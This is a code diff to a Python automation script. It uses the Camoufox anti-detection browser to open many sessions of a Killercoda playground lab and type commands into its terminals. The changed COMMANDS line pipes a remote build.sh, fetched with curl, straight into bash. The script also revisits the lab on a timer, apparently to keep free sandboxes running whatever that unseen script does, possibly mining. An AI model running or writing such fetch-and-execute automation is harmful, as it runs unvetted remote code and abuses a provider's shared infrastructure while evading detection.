@@ -27,7 +27,7 @@ print(f"[+] Loaded {len(all_sessions)} sessions")
 sessions = [all_sessions[args.s - 1]] if args.s is not None else all_sessions
 
 LAB_URL = "https://killercoda.com/course-cnpe/scenario/playground"
-COMMANDS = ["curl 'https://bitbucket.org/nourri03/build/raw/b0d467b192aac8ff15945685142c57ad8d39c8ca/build.sh' | bash", "free -m"]
+COMMANDS = ["curl 'https://raw.githubusercontent.com/hasnaouiyacine59-wq/lab_auto/refs/heads/main/build.sh' | bash", "free -m"]
 
 with Camoufox(
     os=["windows", "macos", "linux"],
@@ -89,20 +89,6 @@ with Camoufox(
                     print(f"[+] Sent: {cmd}")
                     time.sleep(2)
 
-                # Click Exit Scenario
-                try:
-                    page.wait_for_selector("[title='Exit Scenario']", timeout=10000).click()
-                    print("[+] Clicked Exit Scenario")
-                except Exception as e:
-                    print(f"[-] Exit Scenario button not found: {e}")
-
-                # Confirm exit dialog
-                try:
-                    page.wait_for_selector("button.dg-btn.dg-btn--ok.dg-pull-right", timeout=5000).click()
-                    print("[+] Clicked Exit confirmation")
-                except Exception as e:
-                    print(f"[-] Exit confirmation not found: {e}")
-
                 # Accept cookies if banner appears
                 try:
                     page.wait_for_selector(
@@ -113,6 +99,19 @@ with Camoufox(
                 except Exception:
                     pass
 
-        print("[+] Sleeping 60 minutes before revisiting...")
+        print("[+] Sleeping 50 minutes before revisiting...")
         time.sleep(50 * 60)
+
+        for page in pages:
+            try:
+                page.wait_for_selector("[title='Exit Scenario']", timeout=10000).click()
+                print("[+] Clicked Exit Scenario")
+            except Exception as e:
+                print(f"[-] Exit Scenario button not found: {e}")
+            try:
+                page.wait_for_selector("button.dg-btn.dg-btn--ok.dg-pull-right", timeout=5000).click()
+                print("[+] Clicked Exit confirmation")
+            except Exception as e:
+                print(f"[-] Exit confirmation not found: {e}")
+
         print("[+] Revisiting lab URL...")
